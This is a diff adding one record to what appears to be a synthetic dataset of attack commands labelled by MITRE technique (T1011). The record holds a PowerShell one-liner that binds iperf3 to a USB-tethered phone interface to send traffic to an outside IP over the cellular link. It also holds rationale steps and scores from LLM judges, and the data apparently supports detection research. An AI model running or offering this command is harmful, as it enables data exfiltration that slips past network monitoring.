@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=Get-NetAdapter | Where-Object {$_.InterfaceDescription -like '*Remote NDIS based Internet Sharing Device*'}; if($usb){$ip=(Get-NetIPAddress -InterfaceIndex $usb.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 104.87.215.11 -p 61111 -B $ip -u -t 35}",
+  "explanation": "Targets a USB‑tethered RNDIS interface (smartphone tether) and binds iperf3 to it, exfiltrating over the phone’s cellular uplink (alternate medium) as per T1011.",
+  "rationale_steps": [
+    "Locate the USB RNDIS network adapter from a tethered phone.",
+    "Determine its IPv4 address for binding.",
+    "Run iperf3 UDP client on a high port bound to the RNDIS interface.",
+    "Leverage the phone’s cellular path to bypass the primary network."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-c0a371f5",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell one-liner is well-formed with balanced quotes/braces, valid cmdlets and separators, and legitimate iperf3 flags.",
+        "semantic_score": 4,
+        "semantic_justification": "It correctly targets a USB RNDIS interface, derives its IPv4, and binds iperf3 to egress via that medium, though it uses bandwidth test traffic rather than actual data exfiltration and could misbehave if multiple IPs are returned.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-09-30T23:47:42.520282Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced parentheses and braces, proper semicolons as separators, valid Get-NetAdapter/Get-NetIPAddress cmdlet syntax, and correctly formatted iperf3 flags.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly identifies a USB RNDIS tethered interface (smartphone cellular uplink) and binds iperf3 UDP traffic to that specific interface for exfiltration over an alternate network medium, accurately implementing T1011, though iperf3 is a bandwidth testing tool rather than a dedicated exfiltration tool and the actual data being exfiltrated is not specified.",
+        "combined_score": 4.5,
+        "confidence": 0.88,
+        "timestamp": "2026-02-18T21:51:21.888392Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct PowerShell syntax, properly handles variable assignment, object property access, and conditional logic with balanced delimiters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately identifies a tethered cellular interface and uses iperf3 to bind to that specific interface's IP, effectively exfiltrating data (or traffic) over an alternate network medium.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T21:51:26.543305Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
